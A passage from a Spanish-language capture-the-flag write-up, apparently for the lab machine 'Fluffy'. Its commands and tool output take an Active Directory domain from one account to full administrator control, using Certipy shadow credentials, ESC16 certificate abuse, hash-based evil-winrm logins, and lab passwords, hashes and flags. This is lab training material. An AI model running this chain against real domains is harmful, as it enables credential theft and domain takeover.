Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:35 DONE (2025-09-12 00:32) 0g/s 401336p/s 1204Kc/s 1204KC/s !)(OPPQR..*7¡Vamos!
Session completed. 
```

> **Importante** sincronizar con el DC antes de ejcutar cualquier ataque el timezone:

Ademas vemos que **p.agila** (Outbound object control) -> pertenece a **SERVICE ACCOUNT MANAGERS** -- Generic All --> **SERVICE ACCOUNT** (ca_svc Certification Authority). 

* Usamos ** certipy-ad ** para efectuar distintos tipos de ataques y enumeracion sobre el DC con las credenciales obtenidas hasta el momento. Pero antes debemos agregar a **p.agila** al grupo **SERVICE ACCOUNT**

```bash
bloodyAD --host 10.10.11.69 -d fluffy.htb -u 'p.agila' -p 'prometheusx-303' add groupMember 'Service Accounts' p.agila
[+] p.agila added to Service Accounts
```
[Cheatsheet certipy-ad](https://www.hackingarticles.in/a-detailed-guide-on-certipy/)

```bash
  certipy-ad find -u p.agila -p prometheusx-303 -dc-ip 10.10.11.69 -target-ip 10.10.11.69 -vulnerable -enable -stdout
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace                                                                                                                                                                              
[!] Error checking web enrollment: timed out                                                                                                                                                                      
[!] Use -debug to print a stacktrace                                                                                                                                                                              
[*] Enumeration output:                                                                                                                                                                                           
Certificate Authorities                                                                                                                                                                                           
  0                                                                                                                                                                                                               
    CA Name                             : fluffy-DC01-CA                                                                                                                                                          
    DNS Name                            : DC01.fluffy.htb                                                                                                                                                         
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb                                                                                                                                    
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5                                                                                                                                        
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00                                                                                                                                               
    Certificate Validity End            : 3024-04-17 16:11:16+00:00                                                                                                                                               
    Web Enrollment                                                                                                                                                                                                
      HTTP                                                                                                                                                                                                        
        Enabled                         : False                                                                                                                                                                   
      HTTPS                                                                                                                                                                                                       
        Enabled                         : False                                                                                                                                                                   
    User Specified SAN                  : Disabled                                                                                                                                                                
    Request Disposition                 : Issue                                                                                                                                                                   
    Enforce Encryption for Requests     : Enabled                                                                                                                                                                 
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy                                                                                                                            
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
Certificate Templates                   : [!] Could not find any certificate templates
```

* Obtenemos hashesNTLM:

- winrm_svc

```bash
  certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account 'winrm_svc'                           
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
[!] Use -debug to print a stacktrace
[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '3ab58b9d667c4173ba9845a678ca9845'
[*] Adding Key Credential with device ID '3ab58b9d667c4173ba9845a678ca9845' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID '3ab58b9d667c4173ba9845a678ca9845' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'winrm_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'winrm_svc.ccache'
[*] Wrote credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
```

- ca_svc: (Certification Authority service)

```bash
  certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account 'ca_svc'                                 
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
[!] Use -debug to print a stacktrace
[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'bf57d70fdfd042779a4cb0aae00c1ae8'
[*] Adding Key Credential with device ID 'bf57d70fdfd042779a4cb0aae00c1ae8' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID 'bf57d70fdfd042779a4cb0aae00c1ae8' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'ca_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ca_svc.ccache'
[*] Wrote credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
```

- ldap_svc

```bash
  certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account 'ldap_svc'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
[!] Use -debug to print a stacktrace
[*] Targeting user 'ldap_svc'
[*] Generating certificate                                                                                                                                                                                        
[*] Certificate generated                                                                                                                                                                                         
[*] Generating Key Credential                                                                                                                                                                                     
[*] Key Credential generated with DeviceID 'd6314b344eda43a39f7a5851235af1f8'                                                                                                                                     
[*] Adding Key Credential with device ID 'd6314b344eda43a39f7a5851235af1f8' to the Key Credentials for 'ldap_svc'                                                                                                 
[*] Successfully added Key Credential with device ID 'd6314b344eda43a39f7a5851235af1f8' to the Key Credentials for 'ldap_svc'                                                                                     
[*] Authenticating as 'ldap_svc' with the certificate                                                                                                                                                             
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'ldap_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ldap_svc.ccache'
[*] Wrote credential cache to 'ldap_svc.ccache'
[*] Trying to retrieve NT hash for 'ldap_svc'
[*] Restoring the old Key Credentials for 'ldap_svc'
[*] Successfully restored the old Key Credentials for 'ldap_svc'
[*] NT hash for 'ldap_svc': 22151d74ba3de931a352cba1f9393a37
```

* Propagamos:

```bash
  nxc winrm 10.10.11.69 -u users.txt -H hashes.txt --continue-on-success

WINRM       10.10.11.69     5985   DC01             [+] fluffy.htb\winrm_svc:33bd09dcd697600edf6b3a7af4875767 (Pwn3d!)
```

* Nos conectamos por evil-winrm:

```bash
  evil-winrm -i 10.10.11.69 -u 'winrm_svc' -H '33bd09dcd697600edf6b3a7af4875767' -P 5985
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\winrm_svc> Get-ChildItem -Path C:\Users -Include *.txt -File -Recurse -ErrorAction SilentlyContinue


    Directory: C:\Users\winrm_svc\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        9/11/2025   1:23 PM             34 user.txt
*Evil-WinRM* PS C:\Users\winrm_svc> type C:\Users\winrm_svc\Desktop\user.txt
0d011547ce7d5246e914971ee4f19ef3
```
#### Escalada de privilegios

* Enumeracion 

```bash
*Evil-WinRM* PS C:\Users\winrm_svc> Get-Service -Name spooler

Status   Name               DisplayName
------   ----               -----------
Stopped  spooler            Print Spooler


*Evil-WinRM* PS C:\Users\winrm_svc> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\winrm_svc> 
```

> No encontramos mucho dentro de la session evil-winrm continuamos con certipy-ad


1. Revisamos vulneravilidades

```bash
  certipy-ad find -vulnerable -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -stdout
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment
      HTTP                                                                                                                                                                                                        
        Enabled                         : False                                                                                                                                                                   
      HTTPS                                                                                                                                                                                                       
        Enabled                         : False                                                                                                                                                                   
    User Specified SAN                  : Disabled                                                                                                                                                                
    Request Disposition                 : Issue                                                                                                                                                                   
    Enforce Encryption for Requests     : Enabled                                                                                                                                                                 
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy                                                                                                                            
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2                                                                                                                                                    
    Permissions                                                                                                                                                                                                   
      Owner                             : FLUFFY.HTB\Administrators                                                                                                                                               
      Access Rights                                                                                                                                                                                               
        ManageCa                        : FLUFFY.HTB\Domain Admins                                                                                                                                                
                                          FLUFFY.HTB\Enterprise Admins                                                                                                                                            
                                          FLUFFY.HTB\Administrators                                                                                                                                               
        ManageCertificates              : FLUFFY.HTB\Domain Admins                                                                                                                                                
                                          FLUFFY.HTB\Enterprise Admins                                                                                                                                            
                                          FLUFFY.HTB\Administrators                                                                                                                                               
        Enroll                          : FLUFFY.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates
```

[ESC16: Security Extension Disabled on CA (Globally)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally)

* Explotamos el ticket kerberos de ** ca_svc **

1. Explortamos el ticket

```bash
export KRB5CCNAME=ca_svc.ccache
```
2. Leemos atributos de ** ca_svc **

```bash
  certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -user 'ca_svc' read
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'ca_svc':
    cn                                  : certificate authority service
    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
    name                                : certificate authority service
    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
    sAMAccountName                      : ca_svc
    servicePrincipalName                : ADCS/ca.fluffy.htb
    userPrincipalName                   : ca_svc@$dc01.fluffy.htb
    userAccountControl                  : 66048
    whenCreated                         : 2025-04-17T16:07:50+00:00
    whenChanged                         : 2025-09-12T05:47:50+00:00
```

3. Modificamos el **UPN** de cs_svc a administrator

```bash
  certipy-ad account -u 'ca_svc@fluffy.htb' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -upn 'administrator' -user 'ca_svc' update
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'
```

4. Solicitamos un certificado al servicio de Certificate Authority (CA)

```bash
  certipy-ad req -u 'ca_svc@fluffy.htb' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -target 10.10.11.69 -ca 'fluffy-DC01-CA' -template 'User'    
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
[!] Use -debug to print a stacktrace
[*] Requesting certificate via RPC
[*] Request ID is 17
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```
5. Restauramos el UPN de ** ca_svc **

```bash
  certipy-ad account -u 'ca_svc@fluffy.htb' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update  
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc@fluffy.htb
[*] Successfully updated 'ca_svc'
```
6. Utilizamos el certificado para obtener el hashNTLM del administrador:

```bash
  certipy-ad auth -pfx administrator.pfx -username 'administrator' -domain 'fluffy.htb' -dc-ip 10.10.11.69
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```
7. Nos conectamos con evil-winrm

```bash
  evil-winrm -i 10.10.11.69 -u 'administrator' -H '8da83a3fa618b6e3a00e93f676c92a6e'  
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-ChildItem -Path C:\Users -Include *.txt -File -Recurse -ErrorAction SilentlyContinue
                                                                                                                                                                                                                  
                                                                                                                                                                                                                  
    Directory: C:\Users\Administrator\Desktop                                                                                                                                                                     
                                                                                                                                                                                                                  
                                                                                                                                                                                                                  
Mode                LastWriteTime         Length Name                                                                                                                                                             
----                -------------         ------ ----                                                                                                                                                             
-ar---        9/11/2025   1:23 PM             34 root.txt                                                                                                                                                         
                                                                                                                                                                                                                  
                                                                                                                                                                                                                  
    Directory: C:\Users\winrm_svc\Desktop                                                                                                                                                                         
                                                                                                                                                                                                                  
                                                                                                                                                                                                                  
Mode                LastWriteTime         Length Name                                                                                                                                                             
----                -------------         ------ ----                                                                                                                                                             
-ar---        9/11/2025   1:23 PM             34 user.txt                                                                                                                                                         
                                                                                                                                                                                                                  
                                                                                                                                                                                                                  
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
0c62d16fe2f55801bdceb41994e9ed7d
```
